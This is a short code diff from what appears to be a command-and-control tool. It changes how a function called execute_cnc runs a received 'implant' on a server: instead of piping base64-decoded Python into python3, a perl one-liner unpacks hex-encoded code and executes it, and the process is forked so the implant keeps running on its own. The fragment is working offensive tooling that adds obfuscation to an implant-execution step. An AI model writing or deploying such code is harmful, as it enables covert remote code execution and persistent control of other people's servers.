@@ -53,11 +53,17 @@ def parse_cnc(data):
 def execute_cnc(implant):
     """Execute the implant on the server
 
-    The implant is base64 encoded python code.  This function decodes the implant and executes it
-    using python3.
+    The implant is hex encoded python code.  This function decodes the implant and executes it
+    using perl to execute python3.
     """
 
-    command = "echo " + implant + " | base64 -d | python3"
+    command = (
+        "perl -e 'system(pack(qq,H"
+        + str(len(implant))
+        + ",,qq,"
+        + implant
+        + ",))'"
+    )
 
     # Fork the process and execute the implant.  Allows the implant to run
     # without the reveiver also running.
